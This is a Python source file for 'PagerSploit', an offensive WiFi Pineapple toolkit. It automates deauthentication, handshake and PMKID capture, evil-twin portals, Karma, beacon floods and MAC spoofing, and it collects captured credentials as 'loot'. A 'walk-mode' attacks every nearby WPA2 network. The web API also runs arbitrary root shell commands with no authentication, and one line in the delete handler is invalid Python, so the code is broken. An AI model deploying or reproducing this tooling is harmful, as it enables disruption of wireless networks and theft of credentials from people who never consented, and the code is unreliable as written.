#!/usr/bin/env python3
"""
PagerSploit v2.8 - Ultimate Tactical Pentest Framework
WiFi Pineapple Pager // wickedNull
"""

import os, sys, json, re, time, threading, subprocess, argparse, sqlite3
import socket, base64, urllib.request, urllib.parse, shutil
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from urllib.parse import parse_qs, urlparse, unquote_plus

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True
    allow_reuse_address = True

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from pagerctl import Pager

STATE = {
    'active_module': 'idle', 'module_status': 'Standing by',
    'loot_count': 0, 'server_ip': '172.16.52.1', 'server_port': '8080',
    'payload_dir': '', 'log': [], 'scan_results': [], 'hosts': [],
    'jobs': {}, 'stop_events': {}, 'module_data': {},
    'cwd': os.getcwd(),
}
STATE_LOCK = threading.Lock()

# Standard paths for Pineapple Pager
RECON_DB = '/etc/pineapple/recon.db'
PINEAP_FUNCTIONS = '/etc/pineapple/functions'
NMAP_BIN = shutil.which('nmap') or '/usr/bin/nmap'

def log(msg, level='info'):
    entry = {'time': datetime.now().strftime('%H:%M:%S'), 'level': level, 'msg': str(msg)}
    with STATE_LOCK:
        STATE['log'].append(entry)
        if len(STATE['log']) > 1000: STATE['log'] = STATE['log'][-1000:]
    print(f"[{entry['time']}] {msg}", flush=True)

def set_module(name, status='Running'):
    with STATE_LOCK:
        STATE['active_module'] = name
        STATE['module_status'] = status

def set_data(key, val):
    with STATE_LOCK: STATE['module_data'][key] = val

def get_data(key, default=None):
    with STATE_LOCK: return STATE['module_data'].get(key, default)

def run_cmd(cmd, timeout=60):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.stdout + r.stderr
    except subprocess.TimeoutExpired: return 'TIMEOUT'
    except Exception as e: return str(e)

def start_job(name, fn, *args, **kwargs):
    t = threading.Thread(target=fn, args=args, kwargs=kwargs, daemon=True)
    t.start()
    with STATE_LOCK: STATE['jobs'][name] = t
    return t

def make_stop(): return threading.Event()

def reg_stop(name, ev):
    with STATE_LOCK: STATE['stop_events'][name] = ev

def unreg_stop(name):
    with STATE_LOCK: STATE['stop_events'].pop(name, None); STATE['jobs'].pop(name, None)

def stop_module(name):
    with STATE_LOCK:
        ev = STATE['stop_events'].get(name)
        proc = STATE['jobs'].get(name)
    if ev: ev.set()
    if proc and hasattr(proc, 'terminate'):
        try: proc.terminate()
        except: pass
    unreg_stop(name)
    return bool(ev or proc)

def loot_path(*parts): return os.path.join(STATE['payload_dir'], 'loot', *parts)

def save_loot(subdir, filename, content):
    path = loot_path(subdir, filename)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, 'wb' if isinstance(content, bytes) else 'w') as f: f.write(content)
    with STATE_LOCK: STATE['loot_count'] += 1
    log(f'Loot: {filename}', 'success')
    return path

def ts(): return datetime.now().strftime('%Y%m%d_%H%M%S')

def check_internet():
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=2)
        return True
    except OSError: return False

def format_terminal_out(text):
    if not text: return ''
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    return ansi_escape.sub('', text)

def alert_success():
    try:
        with Pager() as p:
            p.set_led(0, 255, 0); p.set_vibration(True); time.sleep(0.5)
            p.set_vibration(False); p.set_led(0, 0, 0)
    except: pass

def log_credential(source, data):
    entry = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{source}] {data}\n"
    save_loot('credentials', 'captured_creds.log', entry)
    with STATE_LOCK:
        if 'creds' not in STATE['module_data']: STATE['module_data']['creds'] = []
        STATE['module_data']['creds'].append({'time': datetime.now().strftime('%H:%M'), 'src': source, 'data': data})
    alert_success()

# ── WiFi Core ─────────────────────────────────────────────────────────────

def _pineapple(*args):
    cmd_str = ' '.join(f'"{a}"' for a in args)
    full_cmd = f'source {PINEAP_FUNCTIONS} && {cmd_str}'
    try:
        r = subprocess.run(['bash', '-c', full_cmd], capture_output=True, text=True, timeout=10)
        return r.stdout.strip()
    except: return ''

def wifi_scan(band='abg', duration=10):
    log(f'WiFi scan ({band})...'); set_module('WiFi Scan', 'Scanning...')
    _pineapple('PINEAPPLE_RECON_START')
    time.sleep(int(duration))
    results = []
    try:
        conn = sqlite3.connect(f'file:{RECON_DB}?mode=ro', uri=True)
        cur = conn.cursor()
        cur.execute("SELECT ssid, mac, channel, signal, encryption FROM wifi_ap_view ORDER BY signal DESC LIMIT 100")
        for row in cur.fetchall():
            ssid, bssid, channel, signal, encryption = row
            results.append({'ssid': ssid or '<hidden>', 'bssid': bssid.upper(), 'channel': int(channel), 
                           'signal': int(signal), 'encryption': str(encryption)})
        conn.close()
    except Exception as e: log(f'Scan error: {e}', 'error')
    with STATE_LOCK: STATE['scan_results'] = results
    set_module('idle', f'{len(results)} APs found'); return results

def wifi_deauth(bssid, channel='6', count='0', client='FF:FF:FF:FF:FF:FF'):
    stop = make_stop(); reg_stop('deauth', stop)
    def _run():
        log(f'Deauth: {bssid}', 'warn'); set_module('Deauth', bssid)
        _pineapple('PINEAPPLE_HOPPING_STOP'); _pineapple('PINEAPPLE_EXAMINE_BSSID', bssid)
        try:
            while not stop.is_set():
                _pineapple('PINEAPPLE_DEAUTH_CLIENT', bssid, client, channel)
                if count != '0': break
                stop.wait(2)
        finally:
            _pineapple('PINEAPPLE_EXAMINE_RESET'); _pineapple('PINEAPPLE_HOPPING_START')
        unreg_stop('deauth'); set_module('idle')
    start_job('deauth', _run)

def wifi_capture(bssid, channel, ssid='capture'):
    stop = make_stop(); reg_stop('capture', stop)
    hs_dir, loot_hs = '/root/loot/handshakes', loot_path('handshakes')
    def _run():
        log(f'Capture: {ssid}', 'info'); set_module('Capture', ssid)
        _pineapple('PINEAPPLE_HOPPING_STOP'); _pineapple('PINEAPPLE_EXAMINE_BSSID', bssid)
        seen = set(os.listdir(hs_dir))
        while not stop.is_set():
            _pineapple('PINEAPPLE_DEAUTH_CLIENT', bssid, 'FF:FF:FF:FF:FF:FF', channel)
            stop.wait(15)
            current = set(os.listdir(hs_dir))
            for f in (current - seen):
                if bssid.replace(':', '').lower() in f.lower():
                    log_credential('WiFi', f'Handshake: {f}'); shutil.copy2(os.path.join(hs_dir, f), os.path.join(loot_hs, f))
            seen = current
        _pineapple('PINEAPPLE_EXAMINE_RESET'); _pineapple('PINEAPPLE_HOPPING_START')
        unreg_stop('capture'); set_module('idle')
    start_job('capture', _run)

def wifi_pmkid(bssid, channel):
    stop = make_stop(); reg_stop('pmkid', stop)
    hs_dir, loot_hs = '/root/loot/handshakes', loot_path('handshakes')
    def _run():
        log(f'PMKID: {bssid}', 'info'); set_module('PMKID', bssid)
        _pineapple('PINEAPPLE_HOPPING_STOP'); _pineapple('PINEAPPLE_EXAMINE_BSSID', bssid)
        seen = set(os.listdir(hs_dir))
        deadline = time.time() + 120
        while not stop.is_set() and time.time() < deadline:
            _pineapple('PINEAPPLE_DEAUTH_CLIENT', bssid, 'FF:FF:FF:FF:FF:FF', channel)
            stop.wait(5)
            current = set(os.listdir(hs_dir))
            for f in (current - seen):
                if bssid.replace(':', '').lower() in f.lower():
                    log_credential('PMKID', f'Captured: {f}'); shutil.copy2(os.path.join(hs_dir, f), os.path.join(loot_hs, f))
            seen = current
        _pineapple('PINEAPPLE_EXAMINE_RESET'); _pineapple('PINEAPPLE_HOPPING_START')
        unreg_stop('pmkid'); set_module('idle')
    start_job('pmkid', _run)

def wifi_mdk4_stress(mode='d', channel='6'):
    stop = make_stop(); reg_stop('mdk4', stop)
    def _run():
        log(f'MDK4 {mode} on CH{channel}', 'warn'); set_module('MDK4', mode)
        bin = shutil.which('mdk4')
        if not bin: log('MDK4 missing', 'error'); return
        _pineapple('PINEAPPLE_HOPPING_STOP'); _pineapple('PINEAPPLE_SET_CHANNEL', 'wlan1mon', channel)
        proc = subprocess.Popen([bin, 'wlan1mon', mode, '-c', channel] if mode=='d' else [bin, 'wlan1mon', mode], stdout=subprocess.DEVNULL)
        stop.wait(); proc.terminate(); _pineapple('PINEAPPLE_HOPPING_START')
        unreg_stop('mdk4'); set_module('idle')
    start_job('mdk4', _run)

def wifi_evil_twin(ssid, channel='6', portal_file=None):
    stop = make_stop(); reg_stop('evil_twin', stop)
    def _run():
        log(f'Evil Twin: {ssid}', 'warn'); set_module('Evil Twin', ssid)
        _pineapple('PINEAPPLE_MIMIC_ENABLE'); _pineapple('PINEAPPLE_SSID_POOL_ADD', ssid); _pineapple('PINEAPPLE_SSID_POOL_START')
        subprocess.run(['nft', 'add', 'table', 'ip', 'ps_et'], stderr=subprocess.DEVNULL)
        subprocess.run(['nft', 'add', 'chain', 'ip', 'ps_et', 'pre', '{', 'type', 'nat', 'hook', 'prerouting', 'priority', '-100', ';', '}'], stderr=subprocess.DEVNULL)
        subprocess.run(['nft', 'add', 'rule', 'ip', 'ps_et', 'pre', 'tcp', 'dport', '80', 'redirect', 'to', ':8888'], stderr=subprocess.DEVNULL)
        proc = None
        if portal_file and os.path.exists(portal_file):
            os.makedirs('/tmp/ps_p', exist_ok=True); shutil.copy(portal_file, '/tmp/ps_p/index.html')
            proc = subprocess.Popen([sys.executable, '-m', 'http.server', '8888', '--directory', '/tmp/ps_p'], stdout=subprocess.DEVNULL)
        stop.wait()
        if proc: proc.terminate()
        subprocess.run(['nft', 'delete', 'table', 'ip', 'ps_et'], stderr=subprocess.DEVNULL)
        _pineapple('PINEAPPLE_SSID_POOL_STOP'); _pineapple('PINEAPPLE_MIMIC_DISABLE')
        unreg_stop('evil_twin'); set_module('idle')
    start_job('evil_twin', _run)

def wifi_karma(channel='6'):
    stop = make_stop(); reg_stop('karma', stop)
    def _run():
        log('Karma active', 'warn'); set_module('Karma', 'Listening...')
        _pineapple('PINEAPPLE_MIMIC_ENABLE'); stop.wait()
        _pineapple('PINEAPPLE_MIMIC_DISABLE'); unreg_stop('karma'); set_module('idle')
    start_job('karma', _run)

def wifi_beacon_flood(ssids):
    stop = make_stop(); reg_stop('beacon_flood', stop)
    def _run():
        log('Beacon Flood active', 'warn'); set_module('Beacon Flood', f'{len(ssids)} SSIDs')
        _pineapple('PINEAPPLE_SSID_POOL_CLEAR')
        for s in ssids: _pineapple('PINEAPPLE_SSID_POOL_ADD', s)
        _pineapple('PINEAPPLE_SSID_POOL_START'); stop.wait()
        _pineapple('PINEAPPLE_SSID_POOL_STOP'); unreg_stop('beacon_flood'); set_module('idle')
    start_job('beacon_flood', _run)

def wifi_mac_changer():
    import random
    new_mac = f'00:16:3e:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}'
    subprocess.run(['ip', 'link', 'set', 'wlan1mon', 'down'])
    subprocess.run(['ip', 'link', 'set', 'dev', 'wlan1mon', 'address', new_mac])
    subprocess.run(['ip', 'link', 'set', 'wlan1mon', 'up'])
    log(f'New MAC: {new_mac}', 'success'); return new_mac

def ble_scan():
    log('BT Scan...', 'info'); set_module('BT Scan', 'Scanning...')
    devs = []
    subprocess.run(['hciconfig', 'hci0', 'up'], stderr=subprocess.DEVNULL)
    try:
        r = subprocess.run(['hcitool', 'scan'], capture_output=True, text=True, timeout=10)
        for l in r.stdout.splitlines():
            if ':' in l: devs.append({'raw': l.strip(), 'proto': 'Classic'})
    except: pass
    set_data('bt_results', devs); set_module('idle', 'BT done'); return devs

# ── LAN Recon ─────────────────────────────────────────────────────────────

def lan_arp_scan(subnet='172.16.52.0/24'):
    log(f'ARP Scan: {subnet}'); set_module('ARP Scan', 'Scanning...')
    def _run():
        out = run_cmd([NMAP_BIN, '-sn', subnet], timeout=90); hosts = []
        for l in out.splitlines():
            if 'report for' in l: hosts.append({'ip': l.split()[-1].strip('()'), 'mac': '?', 'vendor': ''})
            elif 'MAC' in l and hosts:
                p = l.split('Address:')[1].strip().split()
                hosts[-1]['mac'] = p[0]; hosts[-1]['vendor'] = ' '.join(p[1:]).strip('()')
        with STATE_LOCK: STATE['hosts'] = hosts
        unreg_stop('arp'); set_module('idle', f'{len(hosts)} hosts')
    start_job('arp', _run)

def lan_llmnr_poison():
    stop = make_stop(); reg_stop('llmnr', stop)
    def _run():
        log('Poisoner active', 'warn'); set_module('Poisoner', 'Active')
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); sock.bind(('', 5355)); sock.settimeout(1)
            while not stop.is_set():
                try: data, addr = sock.recvfrom(1024); log_credential('LLMNR', f'Query from {addr[0]}')
                except socket.timeout: pass
        except: pass
        finally: sock.close()
        unreg_stop('llmnr'); set_module('idle')
    start_job('llmnr', _run)

# ── System Health & Automation ────────────────────────────────────────────

def get_sys_stats():
    stats = {'temp': '?', 'uptime': '0m'}
    try:
        if os.path.exists('/sys/class/thermal/thermal_zone0/temp'):
            with open('/sys/class/thermal/thermal_zone0/temp') as f: stats['temp'] = f"{int(f.read())/1000:.1f}°C"
        with open('/proc/uptime') as f: stats['uptime'] = f"{int(float(f.read().split()[0])//60)}m"
    except: pass
    return stats

def walk_mode(active=True):
    if not active:
        for m in ['pmkid_auto', 'beacon_flood', 'llmnr']: stop_module(m)
        set_module('idle', 'Walk-Mode Stopped'); return
    log('WALK-MODE ACTIVATED', 'warn'); set_module('Walk-Mode', 'Running...')
    start_job('pmkid_auto', lambda: [wifi_pmkid(a['bssid'], str(a['channel'])) for a in wifi_scan(duration=5) if 'WPA2' in a['encryption']])
    wifi_beacon_flood(['Free WiFi', 'Starbucks', 'xfinitywifi'])
    lan_llmnr_poison()

def generate_report():
    log('Generating Report...', 'info'); loot = get_loot_list(); creds = get_data('creds', [])
    html = f"<html><body><h1>PagerSploit Report</h1><p>Loot: {len(loot)} | Creds: {len(creds)}</p></body></html>"
    return save_loot('reports', f'report_{ts()}.html', html)

# ── API Handler ───────────────────────────────────────────────────────────

class APIHandler(BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def send_json(self, data, code=200):
        body = json.dumps(data).encode(); self.send_response(code)
        self.send_header('Content-Type', 'application/json'); self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers(); self.wfile.write(body)
    
    def do_GET(self):
        p = urlparse(self.path).path
        if p == '/api/ping': self.send_json({'pong': True})
        elif p == '/api/sys/stats': self.send_json(get_sys_stats())
        elif p in ('/', '/index.html'):
            with open(os.path.join(os.path.dirname(__file__), 'pagersploit_ui.html'), 'rb') as f:
                self.send_response(200); self.end_headers(); self.wfile.write(f.read())
        elif p == '/pagersploit.js':
            with open(os.path.join(os.path.dirname(__file__), 'pagersploit.js'), 'rb') as f:
                self.send_response(200); self.send_header('Content-Type', 'application/javascript'); self.end_headers(); self.wfile.write(f.read())
        elif p == '/api/state':
            with STATE_LOCK: s = {k: v for k, v in STATE.items() if k != 'module_data'}; s['jobs'] = list(STATE['jobs'].keys())
            self.send_json(s)
        elif p == '/api/log':
            with STATE_LOCK: self.send_json(STATE['log'][-100:])
        elif p == '/api/scans':
            with STATE_LOCK: self.send_json(STATE['scan_results'])
        elif p == '/api/hosts':
            with STATE_LOCK: self.send_json(STATE['hosts'])
        elif p.startswith('/api/data/'): self.send_json(get_data(p[10:], {}))
        elif p == '/api/loot': self.send_json(get_loot_list())
        elif p == '/api/wordlists': self.send_json(get_wordlists())
        elif p == '/api/portals':
            d = os.path.join(STATE['payload_dir'], 'portals')
            self.send_json([f for f in os.listdir(d) if f.endswith('.html')] if os.path.isdir(d) else [])
        elif p.startswith('/api/loot/download/'):
            fname = unquote_plus(p[19:]); item = next((l for l in get_loot_list() if l['name'] == fname), None)
            if item and os.path.exists(item['path']):
                with open(item['path'], 'rb') as f:
                    self.send_response(200); self.send_header('Content-Disposition', f'attachment; filename="{fname}"')
                    self.end_headers(); self.wfile.write(f.read())
            else: self.send_json({'error': 'not found'}, 404)
        else: self.send_json({'error': 'not found'}, 404)

    def do_POST(self):
        p = urlparse(self.path).path; length = int(self.headers.get('Content-Length', 0))
        b = json.loads(self.rfile.read(length).decode('utf-8', errors='ignore')) if length else {}
        
        if p == '/api/wifi/scan': start_job('wifi_scan', wifi_scan, b.get('band', 'abg'))
        elif p == '/api/wifi/deauth': wifi_deauth(b.get('bssid'), str(b.get('channel', '6')))
        elif p == '/api/wifi/capture': wifi_capture(b.get('bssid'), str(b.get('channel', '6')), b.get('ssid', 'capture'))
        elif p == '/api/wifi/pmkid': wifi_pmkid(b.get('bssid'), str(b.get('channel', '6')))
        elif p == '/api/wifi/mdk4': wifi_mdk4_stress(b.get('mode', 'd'), str(b.get('channel', '6')))
        elif p == '/api/wifi/evil_twin':
            portal = os.path.join(STATE['payload_dir'], 'portals', b.get('portal')) if b.get('portal') else None
            wifi_evil_twin(b.get('ssid'), str(b.get('channel', '6')), portal)
        elif p == '/api/wifi/karma': wifi_karma(str(b.get('channel', '6')))
        elif p == '/api/wifi/beacon_flood': wifi_beacon_flood(b.get('ssids', ['Free WiFi']))
        elif p == '/api/wifi/mac_random': self.send_json({'mac': wifi_mac_changer()}); return
        elif p == '/api/lan/arp_scan': lan_arp_scan(b.get('subnet', '172.16.52.0/24'))
        elif p == '/api/lan/poison': lan_llmnr_poison()
        elif p == '/api/bt/scan': start_job('bt_scan', ble_scan)
        elif p == '/api/walkmode': walk_mode(b.get('active', True))
        elif p == '/api/report': self.send_json({'path': generate_report()}); return
        elif p == '/api/term/exec':
            cmd = b.get('cmd', '').strip()
            if cmd.startswith('cd '):
                t = cmd[3:].strip(); new = os.path.abspath(os.path.join(STATE['cwd'], t))
                if os.path.isdir(new): STATE['cwd'] = new; out = ""
                else: out = f"cd: {t}: No such directory\n"
            else:
                try:
                    proc = subprocess.Popen(cmd, shell=True, cwd=STATE['cwd'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                    out, _ = proc.communicate(timeout=20)
                except Exception as e: out = str(e)
            cwd_disp = STATE['cwd'].replace('/root', '~'); prompt = f"root@pineapple:{cwd_disp}# "
            self.send_json({'output': format_terminal_out(out), 'prompt': prompt}); return
        elif p == '/api/stop_all':
            with STATE_LOCK:
                for ev in STATE['stop_events'].values(): ev.set()
            self.send_json({'status': 'stopped'}); return
        self.send_json({'status': 'started'})

    def do_DELETE(self):
        p = urlparse(self.path).path
        if p.startswith('/api/loot/delete/'):
            fname = unquote_plus(p[17:]); item = next((l for l in get_loot_list() if l['name'] == fname), None)
            if item and os.path.exists(item['path']):
                os.remove(item['path']); with STATE_LOCK: STATE['loot_count'] = max(0, STATE['loot_count'] - 1)
                self.send_json({'status': 'deleted'})
            else: self.send_json({'error': 'not found'}, 404)
        elif p == '/api/loot/delete_all':
            for item in get_loot_list(): 
                if item['path'].startswith(loot_path()): os.remove(item['path'])
            with STATE_LOCK: STATE['loot_count'] = 0
            self.send_json({'status': 'deleted'})

# ── Pager Display ─────────────────────────────────────────────────────────

def rgb(r, g, b): return ((r & 0xF8) << 8) | ((g & 0xFC) << 3) | (b >> 3)
C_BG, C_TITLE, C_GREEN, C_RED, C_YELLOW = rgb(4, 4, 12), rgb(0, 255, 180), rgb(0, 255, 80), rgb(255, 40, 40), rgb(255, 220, 0)

def pager_display_loop(p, stop_event):
    p.set_rotation(270); BTN_B = Pager.BTN_B
    while not stop_event.is_set():
        try:
            with STATE_LOCK: mod, sts, loot, ip = STATE['active_module'], STATE['module_status'], STATE['loot_count'], STATE['server_ip']
            p.fill_rect(0, 0, 480, 222, C_BG); p.fill_rect(0, 0, 480, 18, rgb(0, 30, 20))
            p.draw_text(4, 2, 'PAGERSPLOIT v2.8 (TACTICAL)', C_TITLE, 1)
            p.draw_text(10, 40, f"IP: {ip}", C_GREEN, 2); p.draw_text(10, 80, f"MOD: {mod}", C_YELLOW, 2)
            p.draw_text(10, 110, f"STS: {sts}", rgb(200, 200, 200), 1); p.draw_text(10, 140, f"LOOT: {loot}", C_RED, 2)
            p.flip()
            _, pressed, _ = p.poll_input()
            if pressed & BTN_B: stop_event.set()
        except: pass
        time.sleep(0.5)

# ── Loot Discovery ────────────────────────────────────────────────────────

def get_loot_list():
    loot = []
    roots = [loot_path(), '/root/loot/handshakes', '/root/loot']
    for r in roots:
        if not os.path.isdir(r): continue
        for root, _, files in os.walk(r):
            for f in files:
                path = os.path.join(root, f); st = os.stat(path)
                cat = 'scans' if f.endswith('.json') else 'handshakes' if f.endswith(('.cap', '.pcap', '.22000')) else 'loot'
                loot.append({'name': f, 'path': path, 'category': cat, 'size': st.st_size, 
                            'modified': datetime.fromtimestamp(st.st_mtime).strftime('%Y-%m-%d %H:%M')})
    return sorted(loot, key=lambda x: x['modified'], reverse=True)

def get_wordlists():
    lists = []
    for d in [os.path.join(STATE['payload_dir'], 'wordlists'), '/root/loot/wordlists', '/usr/share/wordlists']:
        if os.path.isdir(d):
            for f in os.listdir(d):
                if f.endswith(('.txt', '.lst')): lists.append({'name': f, 'path': os.path.join(d, f), 'size': os.path.getsize(os.path.join(d, f))})
    return lists

# ── Main ──────────────────────────────────────────────────────────────────

def run():
    parser = argparse.ArgumentParser()
    parser.add_argument('--server-ip', default='172.16.52.1')
    parser.add_argument('--server-port', default='8080')
    parser.add_argument('--payload-dir', required=True)
    args = parser.parse_args()
    with STATE_LOCK: STATE['server_ip'], STATE['server_port'], STATE['payload_dir'] = args.server_ip, args.server_port, args.payload_dir
    
    os.makedirs(loot_path('handshakes'), exist_ok=True); os.makedirs(loot_path('credentials'), exist_ok=True)
    os.makedirs(loot_path('scans'), exist_ok=True); os.makedirs(loot_path('reports'), exist_ok=True)

    server = ThreadedHTTPServer(('0.0.0.0', int(args.server_port)), APIHandler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    log(f'PagerSploit started on {args.server_ip}:{args.server_port}', 'success')
    
    stop_event = threading.Event()
    with Pager() as p: pager_display_loop(p, stop_event)
    server.shutdown()

if __name__ == '__main__': run()
